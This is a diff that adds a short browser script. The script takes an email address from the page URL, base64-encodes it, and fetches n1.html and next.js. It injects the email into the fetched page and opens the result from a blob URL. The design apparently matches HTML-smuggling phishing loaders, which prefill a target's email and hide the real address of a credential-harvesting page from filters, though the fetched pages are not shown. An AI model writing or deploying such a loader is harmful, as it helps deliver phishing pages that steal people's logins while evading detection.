@@ -1,0 +1,54 @@
+<script>
+(function() {
+  // Read email param from current page and pass it to the opened blob URL (Base64 encoded)
+  const params = new URLSearchParams(window.location.search);
+  const emailParam = params.get('email');
+
+  fetch('n1.html')
+    .then(res => res.text())
+    .then(async html => {
+      let modifiedHtml = html;
+      if (emailParam) {
+        // Decode percent-encoding if present
+        let emailDecoded;
+        try { emailDecoded = decodeURIComponent(emailParam); } catch (e) { emailDecoded = emailParam; }
+
+        // If it looks like a raw email (contains @), base64-encode it; otherwise assume it's already base64
+        let base64Email;
+        if (emailDecoded.includes('@')) {
+          try { base64Email = btoa(emailDecoded); } catch (e) { base64Email = ''; }
+        } else {
+          base64Email = emailDecoded;
+        }
+
+        if (base64Email) {
+          // Convert to URL-safe base64 and strip padding
+          base64Email = base64Email.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+
+          // Prepare safe value and inject as a meta tag (avoids any script tag parsing issues)
+          const injectedValue = base64Email.replace(/"/g, '&quot;').replace(/</g, '&lt;');
+          const injectMeta = '<meta name="injected-email" content="' + injectedValue + '">\n';
+          modifiedHtml = modifiedHtml.replace(/<\/head>/i, injectMeta + '</head>');
+        }
+      }
+
+      // Inline next.js into the blob HTML so the script runs when opening a blob URL
+      try {
+        const nextResp = await fetch('next.js');
+        if (nextResp.ok) {
+          const nextJsText = await nextResp.text();
+          // Replace external script reference with inline script content
+          modifiedHtml = modifiedHtml.replace(/<script\s+[^>]*src=["']next\.js["'][^>]*>\s*<\/script>/i, '<script>' + nextJsText + '<\/script>');
+        }
+      } catch (e) {
+        // If inlining fails, continue — the page may still work when opened from a server
+        console.warn('Could not inline next.js into blob HTML', e);
+      }
+
+      const blob = new Blob([modifiedHtml], { type: 'text/html' });
+      const url = URL.createObjectURL(blob);
+      window.open(url);
+    })
+    .catch(err => console.error('Failed to open n1.html blob:', err));
+})();
+</script>
